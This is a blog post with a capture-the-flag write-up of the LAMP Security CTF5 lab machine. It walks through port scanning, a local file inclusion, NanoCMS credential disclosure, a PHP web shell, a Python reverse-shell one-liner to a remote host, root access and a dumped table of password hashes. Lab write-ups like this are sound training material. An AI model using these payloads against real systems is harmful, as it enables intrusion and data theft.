---
layout: post
title:	"Lamp Security CTF5 Writeup"
date:	2017-12-20 21:30:00
categories:
    - blog
tags:
    - vulnhub
    - root-me
---

LAMP security CTF5 is a funny and easy CTF with a lot of vulnerabilities. You can find info about it on [Vulnhub.com](https://vulnhub.com).

I ran nmap to see which services were open:

~~~
Syrion:~ syrion$ sudo nmap -sT -sV -O ctf04.root-me.org
Password:

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-13 22:39 CEST
Nmap scan report for ctf04.root-me.org (212.129.29.186)
Host is up (0.078s latency).
Not shown: 990 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)
25/tcp   open  smtp        Sendmail 8.14.1/8.14.1
80/tcp   open  http        Apache httpd 2.2.6 ((Fedora))
110/tcp  open  pop3        ipop3d 2006k.101
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X – 4.X (workgroup: MYGROUP)
143/tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)
445/tcp  open  netbios-ssn Samba smbd 3.X – 4.X (workgroup: MYGROUP)
901/tcp  open  http        Samba SWAT administration server
3306/tcp open  mysql       MySQL 5.0.45
Device type: WAP|general purpose|media device|broadband router|PBX
Running (JUST GUESSING): Linux 2.4.X|2.6.X (95%), Sony embedded (95%), Starbridge Networks embedded (95%), Asus embedded (94%), Cisco embedded (94%)
OS CPE: cpe:/o:linux:linux_kernel:2.4.30 cpe:/o:linux:linux_kernel:2.6.27 cpe:/o:sony:smp-n200 cpe:/o:linux:linux_kernel:2.6 cpe:/h:starbridge_networks:1531 cpe:/h:asus:rt-ac66u cpe:/h:asus:rt-n16 cpe:/h:cisco:uc320
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (95%), Linux 2.6.27 (95%), Linux 2.6.9 – 2.6.27 (95%), Sony SMP-N200 media player (95%), Linux 2.6.21 (95%), Starbridge Networks 1531 wireless ASDL modem (95%), Linux 2.6.18 (95%), Tomato 1.28 (Linux 2.6.22) (95%), Asus RT-AC66U router (Linux 2.6) (94%), Asus RT-N16 WAP (Linux 2.6) (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 15 hops
Service Info: Hosts: localhost.localdomain, 10.66.4.100; OS: Unix
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.66 seconds
~~~

How we can see there were a lot of services, but first let’s see the website on port 80. I found a Local File Inclusion (LFI) Vulnerability:

~~~
Warning: include_once(inc/pagina.php.php) [function.include-once]: failed to open stream: No such file or directory in /var/www/html/index.php on line 6

Warning: include_once() [function.include]: Failed opening ‘inc/pagina.php.php’ for inclusion (include_path=’.:/usr/share/pear:/usr/share/php’) in /var/www/html/index.php on line 6
~~~

The warning “include_once(inc/pagina.php.php)” helped me to understand I needed a null byte:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img1.png)

Ok, I found a LFI but i needed to upload something for run code. On blog page there was this NanoCMS:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img2.png)

I found this [vulnerability](http://www.securityfocus.com/bid/34508) for NanoCMS (DirBuster found the same file):

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img3.png)

Ok I got the username and password hash:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img4.png)

Authentication was successful, I created a new page containing a classic “<?php passthru($_GET[“cmd”]); ?>”:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img5.png)

I got a reverse shell on netcat by using this payload:


~~~
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”])
~~~

After some local enumeration, I discovered that the OS was vulnerable to this [exploit](http://www.exploit-db.com/exploits/9479/):

~~~
bash-3.2# id
id
uid=0(root) gid=0(root) groups=48(apache) context=system_u:system_r:httpd_t:s0
bash-3.2# cat /passwd
cat /passwd
237709daa3a06bde0355ff93a9de0ca9
bash-3.2#
~~~

There were much interesting things in the system, for example:

* samba users enumeration
* database credentials (LFI on configuration file of another blog)
* database content:

~~~
+—–+———-+————+———————————-+
| uid | name | login | pass |
+—–+———-+————+———————————-+
| 0 | | 0 | |
| 1 | jennifer | 1241021410 | e3f4150c722e6376d87cd4d43fef0bc5 |
| 2 | patrick | 1475888924 | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 3 | andy | 1241021903 | b64406d23d480b88fe71755b96998a51 |
| 4 | loren | 0 | 6c470dd4a0901d53f7ed677828b23cfd |
| 5 | amy | 0 | e5f0f20b92f7022779015774e90ce917 |
+—–+———-+————+———————————-+
~~~

Bye bye!!!
